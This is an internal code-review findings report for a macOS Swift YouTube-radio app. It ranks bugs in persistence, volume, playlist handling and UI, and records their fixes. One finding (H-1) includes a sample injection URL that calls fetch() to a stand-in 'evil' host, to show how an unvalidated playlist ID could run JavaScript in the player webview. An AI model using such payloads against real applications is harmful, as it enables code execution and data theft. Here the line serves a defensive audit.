# Findings (ranked)

Severity: **H** = fix soon (correctness/security/data-loss), **M** = real but
bounded impact, **L** = polish/debt. File references are to the state of the
code on 2026-07-24 (branch `no-key-youtube-radio-v1`).

---

## H-1 · Playlist-ID JavaScript injection into the player webview

`RadioStore.classify` (RadioStore.swift, `case "playlist":`) accepts **any
non-empty** `list=` query value — unlike video IDs, which get a strict 11-char
charset check. That string is later interpolated directly into JavaScript:

```swift
evaluate("loadList('\(id)',\(index),\(startSeconds))")   // YouTubePlayerView.swift
```

A pasted URL like `youtube.com/playlist?list=');fetch('https://evil…');//`
classifies as a playlist and executes attacker JS inside the player page.
Blast radius is limited (sandboxed webview, no bridge back into app data
beyond the message handler), but the webview has network access and the
bridge accepts state messages — this is still an untrusted-input → code path.

**Fix (small):** validate playlist IDs with the same charset rule already
present in both `YouTubeURLParser.isPlaylistID` and the app: alphanumeric
plus `-`/`_` (and a sane length cap). Best fix is H-2 below — use the
already-tested parser.

## H-2 · Non-atomic, silent persistence writes

`persist()`, `persistResumes()`, `persistPresets()` (RadioStore.swift) all do
`try? data.write(to: url)` — no `.atomic` option, errors swallowed. A crash,
force-quit, or full disk mid-write can truncate `stations.json` and the app
will silently fall back to seeded defaults on next launch (the decode-or-seed
path in `init`), i.e. **total wheel loss that looks like a reset**.

**Fix (one line each):** `data.write(to: url, options: [.atomic])`. Consider
logging failures; consider keeping one `.bak` generation for stations.json.

---

## M-1 · Tuning any station resets volume to 100%

The player shell's `ensurePlay()` (YouTubePlayerView.swift, JS) calls
`player.setVolume(100)` on every `loadVideo`/`loadList`. The HUD volume
slider (`AppState.volume`) is applied only when the *user* moves it — so every
station change blasts back to full volume.

**Fix:** pass the current volume into `ensurePlay()` (e.g.
`loadVideo('id', start, vol)`), or re-apply `setVolume(Int(volume))` from
Swift on each `play(path:)` / on the `ready`+`state` message.

## M-2 · `GTARadioKit.YouTubeURLParser` is unused; the app ships a weaker fork

The package has the stricter parser (validates playlist IDs, supports
nocookie hosts, channels/handles) **and the only unit tests in the project**,
but the app uses its own `RadioStore.classify` duplicate. The duplicate is
where H-1 lives. Divergence will keep happening.

**Fix:** link the package into the app target and make `classify` delegate to
`YouTubeURLParser.parse`, mapping `.video`/`.playlist` and rejecting the rest.

## M-3 · "Fill 26 slots from playlist" silently overwrites occupied slots

`fillFromPlaylist` assigns videos to slots 0…N-1 of the current folder
unconditionally. A user with a curated wheel who taps this option loses those
slots (no confirmation, no undo — though Wheels backup mitigates *if* they
saved). The newer picker deliberately fills empty slots only; the two options
now have inconsistent safety contracts.

**Fix options:** fill empty slots only (match the picker), or auto-backup to
"Last session" first, or add a confirm step naming how many slots will be
replaced.

## M-4 · No feedback when the player never becomes ready (offline)

If `iframe_api` can't load (no network at launch), tunes queue in `pending`
forever with no UI signal and no retry when connectivity returns.

**Fix:** timeout after N seconds → surface a "player offline" state in the
HUD; reload the shell on `NSApplication.didBecomeActive` or on a reachability
signal.

## M-5 · Resume entries are never pruned

`clear(at:)`, folder deletes, and preset deletion leave orphaned uid entries
in `resumes.json` forever. Unbounded (slow) growth; also means a *cleared*
slot's old resume survives into any preset that still carries that uid —
arguably a feature for presets, definitely a leak for cleared stations.

**Fix:** drop resume entries for uids removed from the live tree when they're
not referenced by any preset; or periodically sweep against known uids.

---

## L-1 · ⌘1–9 mapping shifts when a new wheel is saved (inserts at index 0).
Menu shows current mapping, so it's discoverable — but a "pinned order" or
oldest-first numbering would be more predictable.

## L-2 · oEmbed calls are uncached and bursty. `fillFromPlaylist` fires up to
26 sequential fetches; the picker fetches one per visible row and re-fetches
on every sheet reopen. A tiny in-memory `[videoID: title]` cache would remove
most traffic and rate-limit risk.

## L-3 · Playlist scraping is brittle by nature. Regex over page HTML
(`"videoId":"…"`) also matches recommendation modules, only sees the first
~100 items, and breaks if YouTube reshapes markup. Acceptable for a no-key
app; worth documenting (done: 04-playback-pipeline.md) and guarding with the
existing empty-result checks.

## L-4 · `shuffleAllStations()` only shuffles the *current folder* — name
overpromises; either recurse or rename.

## L-5 · Silent `try?` everywhere in metadata fetches means a failed
oEmbed/scrape leaves provisional names ("YouTube Radio") with no retry.
Consider a light retry on next play of that station.

## L-6 · `SettingsStore` is not `@MainActor` yet is used from UI and
AppDelegate; safe in practice (all main-thread), but annotating it would make
the contract explicit and future-proof under strict concurrency.

## L-7 · Duplicate `imbi FM`-style entries are possible: the picker dedupes
video IDs within a playlist, but nothing warns when adding a video that's
already on the wheel. Cosmetic; a "already on slot N" hint would help.

## L-8 · `seek(to:)` bypasses the JS `ctl()` wrapper (style inconsistency;
see 04-playback-pipeline.md §5).

---

## Second-pass hunt (2026-07-24) — found & fixed same day

- Picker adds could land in the wrong folder (live `currentPath` read during
  the post-dismiss assign loop) and rapid double-click adds could race for
  one slot → parent captured at action time, slot resolved inside the
  MainActor task (`e7e17dd`).
- Shuffle badge stayed lit after tuning to a new list, though fresh loads are
  always unshuffled → `play()` resets `shuffleOn` (`2a8e2e0`).
- Mid-scrub value could exceed the slider range when a playlist advanced to a
  shorter track → clamped (`2a8e2e0`).
- Settings allowed a zero-modifier hotkey, registering a bare letter
  **globally** (typing that letter in any app triggered the dial) →
  `ensureModifier()` re-enables ⌥ when the last modifier is switched off
  (`34da1db`).
- Dial center panel (300pt) overflowed by the transport+volume row (~320pt),
  scattering controls → widened to 340pt (`34da1db`).

Still open, noticed but deliberately not "fixed": loading a wheel preset
while picker assigns are still running applies those adds to the new wheel's
empty slots — rare double-async edge; revisit only if it bites.

## Resolved during recent work (for the record)

- **H-1 fixed** (`1e87cbd`): `classify` now charset-validates playlist IDs
  (both `playlist` and `embed/videoseries` paths).
- **H-2 fixed** (`1e87cbd`): all three JSON writes are `.atomic`.
- **M-1 fixed** (`8544c82`): loads re-apply the user's volume.
- **User-reported: second playlist never loaded** (`8544c82`): `playVideo()`
  fired immediately after `loadPlaylist()` made the IFrame player resume the
  old list; removed the extra `playVideo` (load*() autoplays) and `stopVideo()`
  first. Keep this contract in the player shell.
- **Playlist visibility** (`f20d7fa`): add sheet now probes the playlist page
  and warns on private/unavailable lists, disabling scrape-dependent options.

- Audio-only mode locked window resizing (unclipped `.fill` artwork inflating
  layout) — fixed via overlay-on-clear + `.clipped()`.
- Dial hover dead/stuck: per-node `.onHover` fought hover-driven motion —
  replaced with sector-based hover (`onContinuousHover` + angle math).
  **Do not reintroduce per-node hover on moving nodes.**
- HUD clipping on resize; playlist sheet button overflow; playlist stations
  missing thumbnails/titles (see git history `3176e86`, `ce2b271`, `c731d6a`).
